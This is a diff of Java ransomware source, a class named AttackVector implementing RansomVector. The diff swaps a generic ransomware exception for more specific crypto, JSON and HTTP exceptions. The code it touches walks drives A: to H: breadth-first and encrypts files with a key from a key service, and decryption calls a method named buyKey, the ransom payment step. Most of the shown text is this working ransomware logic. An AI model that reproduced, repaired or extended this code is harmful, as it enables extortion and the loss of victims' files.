@@ -13,10 +13,11 @@ import Agent.entites.AlgorithmsMap;
 import Agent.entites.CryptoKey;
 import Agent.exceptions.AlgorithmNotFoundException;
 import Agent.exceptions.CryptoException;
+import Agent.exceptions.HttpResException;
 import Agent.exceptions.InOutException;
+import Agent.exceptions.JsonException;
 import Agent.exceptions.KeyNotFoundException;
 import Agent.exceptions.PaddingException;
-import Agent.exceptions.RansomwareException;
 import Agent.services.KeyService;
 import Agent.traversal.*;
 
@@ -25,27 +26,34 @@ public class AttackVector implements RansomVector {
 	private KeyService keyService;
 
 	@Override
-	public void encryptFileSystem() throws RansomwareException {
+	public void encryptFileSystem() throws CryptoException, JsonException, HttpResException {
 		try {
 			cryptFileSystem(keyService.getKey(), new EncryptFile());
-		} catch (RansomwareException e) {
-			throw new RansomwareException("Encrypting the file-system failed", e.getCause());
-		}
+		} catch (JsonException e) {
+			throw new JsonException("Wanted CryptoKey not found", e.getCause());
+		} catch (HttpResException e) {
+			throw new HttpResException("connection failed", e.getCause());
+		} catch (CryptoException e) {
+			throw new CryptoException("Encrypting the file-system failed", e.getCause());
 
+		}
 	}
 
 	@Override
-	public void decryptFileSystem() throws RansomwareException {
+	public void decryptFileSystem() throws CryptoException, JsonException, HttpResException {
 		try {
 
 			cryptFileSystem(keyService.buyKey(), new DecryptFile());
-		} catch (RansomwareException e) {
-			throw new RansomwareException("Decrypting the file-system failed", e.getCause());
+		} catch (JsonException e) {
+			throw new JsonException("Wanted CryptoKey not found", e.getCause());
+		} catch (HttpResException e) {
+			throw new HttpResException("connection failed", e.getCause());
+		} catch (CryptoException e) {
+			throw new CryptoException("Decrypting the file-system failed", e.getCause());
 		}
-
 	}
 
-	private void cryptFileSystem(CryptoKey key, CryptoOperation cryptFunc) throws RansomwareException {
+	private void cryptFileSystem(CryptoKey key, CryptoOperation cryptFunc) throws CryptoException {
 		// Traverse<File> dfs = new DFS<File>();
 		// or
 		Traverse<File> bfs = new BFS<File>();
@@ -54,10 +62,10 @@ public class AttackVector implements RansomVector {
 		for (char i = 'A'; i <= 'H'; i++) {
 			try {
 				traverseAndCrypt(i + ":\\", visitedFolders, key, bfs, cryptFunc);
-			} catch (RansomwareException e) {
-				throw new RansomwareException("Traverse the whole file-system failed", e.getCause());
-			}
+			} catch (CryptoException e) {
+				throw new CryptoException("Traverse the whole file-system failed", e.getCause());
 
+			}
 		}
 	}
 
@@ -103,10 +111,11 @@ public class AttackVector implements RansomVector {
 							throw new PaddingException("padding went wrong", e.getCause());
 						} catch (KeyNotFoundException e) {
 							throw new KeyNotFoundException("key not found", e.getCause());
+						} catch (InOutException e) {
+							throw new InOutException("You do not have the premission to get this information",
+									e.getCause());
 						} catch (CryptoException e) {
 							throw new CryptoException("Problem crypting file", e.getCause());
-						} catch (InOutException e) {
-							throw new InOutException("You dont have enough premission to do this", e.getCause());
 						}
 
 					}
